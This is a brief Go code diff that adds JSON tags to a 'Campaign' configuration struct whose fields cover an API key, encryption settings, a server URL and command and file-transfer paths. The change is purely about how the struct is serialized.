@@ -6,18 +6,17 @@ import (
 )
 
 type Campaign struct {
-	ApiKey string
-	EncKey []byte
+	ApiKey  string `json:"ApiKey"`
+	EncKey  []byte `json:"EncKey"`
+	WithZip bool   `json:"WithZip"`
+	WithEnc bool   `json:"WithEnc"`
 
-	WithZip bool
-	WithEnc bool
+	ServerUrl string `json:"ServerUrl"`
 
-	ServerUrl string
-
-	CommandSendPath         string
-	CommandGetPath          string
-	CommandFileUploadPath   string
-	CommandFileDownloadPath string
+	CommandSendPath         string `json:"CommandSendPath"`
+	CommandGetPath          string `json:"CommandGetPath"`
+	CommandFileUploadPath   string `json:"CommandFileUploadPath"`
+	CommandFileDownloadPath string `json:"CommandFileDownloadPath"`
 }
 
 func MakeCampaign() Campaign {
